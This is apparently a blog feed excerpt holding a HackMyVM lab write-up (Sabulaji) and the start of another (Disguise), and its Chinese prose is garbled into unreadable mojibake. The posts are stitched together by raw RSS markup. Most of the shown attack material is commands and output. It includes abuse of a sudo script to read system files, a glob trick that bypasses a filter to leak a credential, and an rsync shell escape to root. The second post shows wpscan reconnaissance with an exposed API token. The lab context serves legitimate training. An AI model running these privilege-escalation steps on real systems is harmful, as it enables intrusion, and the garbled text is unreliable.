ÈÇ£‰πàÔºåÊàë‰ª¨Â¶Ç‰ΩïÊéåÊè°ËøôÈó®Ëâ∫ÊúØÂë¢ÔºüÈ¶ñÂÖàÔºåËûçÂÖ•ÂÖ∂‰∏≠„ÄÇ‰∏çË¶ÅËÆ©‰Ω†ÁöÑÁßòÂØÜÊòæËÄåÊòìËßÅ„ÄÇÂÖ∂Ê¨°ÔºåÁî®ÊØî‚ÄúP@ssw0rd123ÔºÅ‚ÄùÊõ¥Âº∫Á°¨ÁöÑËØ≠Ê∞îÊù•‰øùÊä§ÂÆÉ‚Äî‚Äî‰πüËÆ∏ËøôÂè•ËØùÂè™Êúâ‰Ω†Ëá™Â∑±ÊâçËÉΩÁêÜËß£„ÄÇÊúÄÂêéÔºåË∞®ÊÖé‰ø°‰ªª„ÄÇÂç≥‰ΩøÊòØÊúÄÂèãÂñÑÁöÑÁ≥ªÁªüÔºåÂ¶ÇÊûú‰Ω†‰∏çÂ∞èÂøÉÔºå‰πüÂèØËÉΩËÉåÂèõ‰Ω†„ÄÇ
ÊúÄÁªàÔºåÁßòÂØÜÊèêÈÜíÊàë‰ª¨ÔºåÂπ∂ÈùûÊâÄÊúâ‰∫ãÊÉÖÈÉΩÈúÄË¶ÅÂàÜ‰∫´„ÄÇÊúâ‰∫õ‰∫ãÊÉÖÊúÄÂ•Ω‰∏çË¶ÅËØ¥ÔºåÊàñËÄÖËá≥Â∞ëÁïôÁªôÈÇ£‰∫õÁü•ÈÅìÂéªÂì™ÈáåÊâæÁöÑ‰∫∫„ÄÇ
```

welcome:P@ssw0rd123!

ÁôªÂΩïssh

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/tmp/epages]
‚îî‚îÄ$ ssh welcome@192.168.205.136
The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    (4 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.
welcome@192.168.205.136's password: 
Permission denied, please try again.
welcome@192.168.205.136's password: 
Linux Sabulaji 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
```

ÊâíÊãâ

```
welcome@Sabulaji:~$ ls -la
total 24
drwxr-xr-x 2 welcome welcome 4096 May 16 01:21 .
drwxr-xr-x 4 root    root    4096 May 15 12:39 ..
lrwxrwxrwx 1 root    root       9 May 15 12:47 .bash_history -&gt; /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 root    root      44 May 15 12:49 user.txt
welcome@Sabulaji:~$ cat user.txt 
flag{user-cf7883184194add6adfa5f20b5061ac7}
welcome@Sabulaji:~$ sudo -l
Matching Defaults entries for welcome on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Sabulaji:
    (sabulaji) NOPASSWD: /opt/sync.sh
welcome@Sabulaji:~$ cat /opt/sync.sh
#!/bin/bash

if [ -z $1 ]; then
    echo 'error: note missing'
    exit
fi

note=$1

if [[ '$note' == *'sabulaji'* ]]; then
    echo 'error: forbidden'
    exit
fi

difference=$(diff /home/sabulaji/personal/notes.txt $note)

if [ -z '$difference' ]; then
    echo 'no update'
    exit
fi

echo 'Difference: $difference'

cp $note /home/sabulaji/personal/notes.txt

echo '[+] Updated.'
```

ÂÆûÁé∞ÂèÇÊï∞‰∏≠‰∏çËÉΩÂåÖÂê´'sabulaji'ÔºåÁÑ∂Âêé‰ΩøÁî®diff ÂëΩ‰ª§ÊØîËæÉÁõÆÊ†áÊñá‰ª∂ /home/sabulaji/personal/notes.txt ÂíåËæìÂÖ•ÁöÑ note Êñá‰ª∂‰πãÈó¥ÁöÑÂ∑ÆÂºÇ,ËæìÂÖ•note‰∏∫$1

ÂÖàÁúãÁúãÂÆÉ‰∏ÄÂºÄÂßãÊîæ‰∫Ü‰ªÄ‰πà

```
welcome@Sabulaji:~$ sudo -u sabulaji /opt/sync.sh /dev/null
Difference: 1d0
&lt; Maybe you can find it...
[+] Updated.
```

![image-20250612091547195](https://7r1umphk.github.io/image/202506120915456.webp)

‰∏çÔºåÊàëÊâæ‰∏çÂà∞(ÊâãÂä®ÁãóÂ§¥doge)

```
welcome@Sabulaji:~$ cd /tmp/
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/passwd
Difference: 0a1,27
&gt; root:x:0:0:root:/root:/bin/bash
&gt; daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
&gt; bin:x:2:2:bin:/bin:/usr/sbin/nologin
&gt; sys:x:3:3:sys:/dev:/usr/sbin/nologin
&gt; sync:x:4:65534:sync:/bin:/bin/sync
&gt; games:x:5:60:games:/usr/games:/usr/sbin/nologin
&gt; man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
&gt; lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
&gt; mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
&gt; news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
&gt; uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
&gt; proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
&gt; www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
&gt; backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
&gt; list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
&gt; irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
&gt; gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
&gt; nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
&gt; _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
&gt; systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
&gt; systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
&gt; messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
&gt; sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
&gt; welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
&gt; sabulaji:x:1001:1001::/home/sabulaji:/bin/bash
[+] Updated.
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/shadow
diff: /etc/shadow: Permission denied
no update
```

ÊâíÊãâ‰∫ÜÂæà‰πÖÔºåÁÑ∂ÂêéÊàëÂÅ∂ÁÑ∂Èó¥id‰∫Ü‰∏Ä‰∏ã

```
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
```

ÂÆÉÊØîÊ≠£Â∏∏ÁöÑÂ§ö‰∫Ü‰∏Ä‰∏™mlocateÁöÑÁªÑÔºåÁÑ∂ÂêéÊàëÂ∞±ÂéªÊâíÊãâËøô‰∏™ÊòØÂπ≤‰ªÄ‰πàÁöÑ
![image-20250612094149243](https://7r1umphk.github.io/image/202506120941472.webp)

ÂïäËøôÔºåÈÇ£ÊàëÁü•ÈÅì‰∫Ü

```
welcome@Sabulaji:~$ strings /var/lib/mlocate/mlocate.db | less
```

ÁÑ∂ÂêéÊêúÁ¥¢sabulaji

![image-20250612094040790](https://7r1umphk.github.io/image/202506120940995.webp)

ÁúãÁúãÊòØ‰∏çÊòØËøô‰∏™

```
welcome@Sabulaji:/home/sabulaji$ sudo -u sabulaji /opt/sync.sh /home/sabulaji/personal/creds.txt
error: forbidden
```

Âú®ËøôÁ≠âÊàëÂë¢

```
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabulaj*/personal/creds.txt
Difference: 1c1
&lt; 
---
&gt; Sensitive Credentials:Z2FzcGFyaW4=
[+] Updated.
```

Êãø‰∏ã

```
welcome@Sabulaji:/tmp$ cd /home/
welcome@Sabulaji:/home$ su sabulaji
Password: 
sabulaji@Sabulaji:/home$ id
uid=1001(sabulaji) gid=1001(sabulaji) groups=1001(sabulaji)
```

ÊâíÊãâ

```
sabulaji@Sabulaji:/home$ cd sabulaji/
sabulaji@Sabulaji:~$ ls -al
total 24
drwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 .
drwxr-xr-x 4 root     root     4096 May 15 12:39 ..
lrwxrwxrwx 1 root     root        9 May 15 12:47 .bash_history -&gt; /dev/null
-rw-r--r-- 1 sabulaji sabulaji  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 sabulaji sabulaji 3526 Apr 18  2019 .bashrc
drwx------ 2 sabulaji sabulaji 4096 May 16 01:33 personal
-rw-r--r-- 1 sabulaji sabulaji  807 Apr 18  2019 .profile
sabulaji@Sabulaji:~$ cd personal/
sabulaji@Sabulaji:~/personal$ ls -al
total 16
drwx------ 2 sabulaji sabulaji 4096 May 16 01:33 .
drwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 ..
-r-------- 1 sabulaji sabulaji   35 May 16 01:32 creds.txt
-rw-r--r-- 1 sabulaji sabulaji   35 Jun 11 21:56 notes.txt
sabulaji@Sabulaji:~/personal$ sudo -l
Matching Defaults entries for sabulaji on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sabulaji may run the following commands on Sabulaji:
    (ALL) NOPASSWD: /usr/bin/rsync
```

ÊúâÁé∞ÊàêÁöÑ

https://gtfobins.github.io/gtfobins/rsync/#sudo

```
sabulaji@Sabulaji:~/personal$ sudo rsync -e 'sh -c 'sh 0&lt;&amp;2 1&gt;&amp;2'' 127.0.0.1:/dev/null
# id
uid=0(root) gid=0(root) groups=0(root)
# bash           
root@Sabulaji:/home/sabulaji/personal# cat /root/root.txt 
flag{root-89e62d8807f7986edb259eb2237d011c}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Sabulaji.html</guid><pubDate>Fri, 27 Jun 2025 09:28:59 +0000</pubDate></item><item><title>hmv_DisguiseÈù∂Êú∫Ê∏óÈÄèÊµãËØïËØ¶Ëß£</title><link>https://7r1UMPHK.github.io/post/hmv_Disguise-ba-ji-shen-tou-ce-shi-xiang-jie.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ‰∏éÂàùÊ≠•Êé¢Êµã

## 1.1 ‰∏ªÊú∫ÂèëÁé∞

Ê∏óÈÄèÊµãËØïÁöÑÁ¨¨‰∏ÄÊ≠•ÈÄöÂ∏∏ÊòØÂèëÁé∞ÁΩëÁªú‰∏≠ÁöÑÂ≠òÊ¥ª‰∏ªÊú∫„ÄÇËøôÈáåÊàë‰ª¨‰ΩøÁî®`arp-scan`Â∑•ÂÖ∑ÂØπÊú¨Âú∞ÁΩëÁªúËøõË°åÊâ´Êèè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo arp-scan -l
[sudo] password for kali:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.211 08:00:27:ea:d3:f5       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f8:d7:c5       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.028 seconds (126.23 hosts/sec). 4 responded
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåIPÂú∞ÂùÄ‰∏∫ `192.168.205.211` ÁöÑ‰∏ªÊú∫ÂìçÂ∫î‰∫ÜARPËØ∑Ê±ÇÔºåÂÖ∂MACÂú∞ÂùÄ‰∏∫ `08:00:27:ea:d3:f5`„ÄÇËØ•IPÂ∞Ü‰Ωú‰∏∫Êàë‰ª¨ÂêéÁª≠Ê∏óÈÄèÁöÑÁõÆÊ†á„ÄÇ

## 1.2 Á´ØÂè£Êâ´Êèè

Á°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ÂêéÔºå‰ΩøÁî®`nmap`ËøõË°åÁ´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p- --min-rate 10000 192.168.205.211
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 21:57 EDT
Nmap scan report for 192.168.205.211
Host is up (0.00027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
```

NmapÊâ´ÊèèÁªìÊûúË°®ÊòéÔºåÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü TCP 22Á´ØÂè£ (SSHÊúçÂä°) Âíå TCP 80Á´ØÂè£ (HTTPÊúçÂä°)„ÄÇ

# ‰∫å„ÄÅWebÂ∫îÁî®Ê∏óÈÄèÊµãËØï

## 2.1 ÂüüÂêçËß£Êûê‰∏éÁ´ôÁÇπËØÜÂà´

Áõ¥Êé•ÈÄöËøáIPÂú∞ÂùÄËÆøÈóÆÁõÆÊ†á‰∏ªÊú∫ÁöÑHTTPÊúçÂä° (Á´ØÂè£80)ÔºåÂèëÁé∞ÁΩëÈ°µÂÜÖÂÆπÊèêÁ§∫ÈúÄË¶ÅËß£ÊûêÂüüÂêç„ÄÇ
![image-20250516095849516](https://7r1umphk.github.io/image/20250516095856656.webp)

Ê†πÊçÆÈ°µÈù¢ÊèêÁ§∫ÔºåËØ•Á´ôÁÇπÊúüÊúõÈÄöËøáÂüüÂêç `http://disguise.hmv` ËÆøÈóÆ„ÄÇÊàë‰ª¨Â∞ÜÊ≠§ÂüüÂêç‰∏éÁõÆÊ†áIPÁöÑÊò†Â∞ÑÂÖ≥Á≥ªÊ∑ªÂä†Âà∞Êú¨Âú∞ `/etc/hosts` Êñá‰ª∂‰∏≠„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ echo '192.168.205.211 http://disguise.hmv' | sudo tee -a /etc/hosts &gt; /dev/null

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ tail -n 1 /etc/hosts
192.168.205.211 http://disguise.hmv
```

ÈÖçÁΩÆÂÆåÊàêÂêéÔºåÈÄöËøáÂüüÂêç `http://disguise.hmv` ËÆøÈóÆÁ´ôÁÇπ„ÄÇËßÇÂØüÈ°µÈù¢È°µËÑö‰ø°ÊÅØÔºåÂàùÊ≠•Âà§Êñ≠ËØ•Á´ôÁÇπÊòØÂü∫‰∫éWordPressÊûÑÂª∫ÁöÑ„ÄÇ
![image-20250516100842676](https://7r1umphk.github.io/image/20250516100842781.webp)

## 2.2 WordPressÊºèÊ¥ûÊâ´Êèè‰∏é‰ø°ÊÅØÊî∂ÈõÜ

### 2.2.1 NucleiÊâ´Êèè

È¶ñÂÖàÂ∞ùËØï‰ΩøÁî®`nuclei`ÂØπÁõÆÊ†áWordPressÁ´ôÁÇπËøõË°åËá™Âä®ÂåñÊºèÊ¥ûÊâ´Êèè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nuclei -u http://disguise.hmv/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.2

                projectdiscovery.io

[INF] Current nuclei version: v3.4.2 (outdated)
[INF] Current nuclei-templates version: v10.2.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 42
[INF] Templates loaded for current scan: 7925
[WRN] Loading 198 unsigned templates for scan. Use with caution.
[INF] Executing 7727 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1736 (Reduced 1632 Requests)
[INF] Using Interactsh Server: oast.pro
[INF] No results found. Better luck next time!
```

NucleiÊâ´ÊèèÊú™ÂèëÁé∞ÊòéÊòæÊºèÊ¥û„ÄÇÊé•‰∏ãÊù•‰ΩøÁî®Êõ¥‰∏ì‰∏öÁöÑWordPressÊâ´ÊèèÂ∑•ÂÖ∑`wpscan`„ÄÇ

### 2.2.2 WPScanÊâ´Êèè

ÊâßË°å`wpscan`ÂØπÁ´ôÁÇπËøõË°åËØ¶ÁªÜÊûö‰∏æÔºåÂåÖÊã¨Áî®Êà∑„ÄÅ‰∏ªÈ¢ò„ÄÅÊèí‰ª∂Á≠â„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ wpscan --url 'http://disguise.hmv' --enumerate u,t,p,m --random-user-agent --api-token 6jJQ6zlZssGILOaGfCu2z7aVSLdYgEYokmESJuHejs8
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://disguise.hmv/ [192.168.205.211]
[+] Started: Thu May 15 22:20:25 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://disguise.hmv/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://disguise.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://disguise.hmv/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://disguise.hmv/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://disguise.hmv/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://disguise.hmv/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;
 |  - http://disguise.hmv/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;

[+] WordPress theme in use: newscrunch
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt
 | [!] The version is out of date, the latest version is 1.8.5
 | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1
 | Style Name: Newscrunch
 | Style URI: https://spicethemes.com/newscrunch
 | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.8.4.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1, Match: 'Version: 1.8.4.2'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] *
 | Location: http://disguise.hmv/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:03 &lt;===================================================================================================&gt; (400 / 400) 100.00% Time: 00:00:03
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] newsblogger
 | Location: http://disguise.hmv/wp-content/themes/newsblogger/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newsblogger/readme.txt
 | [!] The version is out of date, the latest version is 0.2.5.6
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/newsblogger/style.css
 | Style Name: NewsBlogger
 | Style URI: https://spicethemes.com/newsblogger-wordpress-theme/
 | Description: NewsBlogger is a dynamic and versatile child theme for the popular NewCrunch WordPress theme. Perfec...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://disguise.hmv/wp-content/themes/newsblogger/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: NewsBlogger &lt; 0.2.5.5 - Cross-Site Request Forgery to Arbitrary Plugin Installation
 |     Fixed in: 0.2.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/916ba2a7-6592-4abf-acbf-63e46111b964
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1305
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7b2cac27-4a36-490f-b2d8-3c6f32843a38
 |
 | [!] Title: NewsBlogger &lt; 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload
 |     Fixed in: 0.2.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/ab2f96dc-e786-48db-8207-a76ec50d7e63
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1304
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/85cea6b5-d57b-495e-a504-a0c1ba691637
 |
 | Version: 0.2.5.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newsblogger/style.css, Match: 'Version: 0.2.5.1'

[+] newscrunch
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt
 | [!] The version is out of date, the latest version is 1.8.5
 | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css
 | Style Name: Newscrunch
 | Style URI: https://spicethemes.com/newscrunch
 | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://disguise.hmv/wp-content/themes/newscrunch/, status: 500
 |
 | Version: 1.8.4.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css, Match: 'Version: 1.8.4.2'

[+] twentytwentyfive
 | Location: http://disguise.hmv/wp-content/themes/twentytwentyfive/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentyfive/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentyfive/style.css
 | Style Name: Twenty Twenty-Five
 | Style URI: https://wordpress.org/themes/twentytwentyfive/
 | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfive/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.0'

[+] twentytwentyfour
 | Location: http://disguise.hmv/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.3 (up to date)
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfour/, status: 200
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.3'

[+] twentytwentythree
 | Location: http://disguise.hmv/wp-content/themes/twentytwentythree/
 | Latest Version: 1.6 (up to date)
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentythree/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentythree/, status: 200
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.6'

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to 'Plain' for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 &lt;===============================================================================================&gt; (100 / 100) 100.00% Time: 00:00:00

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;=====================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] simpleadmin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://disguise.hmv/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] simpleAdmin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 7
 | Requests Remaining: 18

[+] Finished: Thu May 15 22:20:43 2025
[+] Requests Done: 598
[+] Cached Requests: 26
[+] Data Sent: 176.914 KB
[+] Data Received: 23.432 MB
[+] Memory used: 285.922 MB
[+] Elapsed time: 00:00:18
```

WPScanÊâ´ÊèèÁªìÊûúÁöÑÂÖ≥ÈîÆ‰ø°ÊÅØÔºö

*   `robots.txt`Êñá‰ª∂Â≠òÂú®„ÄÇ
*   WordPress ÁâàÊú¨‰∏∫ `6.8.1` (ÊúÄÊñ∞Áâà)„ÄÇ
*   ‰∏ªÈ¢ò `newsblogger` ÁâàÊú¨‰∏∫ `0.2.5.1`ÔºåÂ≠òÂú®‰∏§‰∏™Â∑≤Áü•ÊºèÊ¥ûÔºö
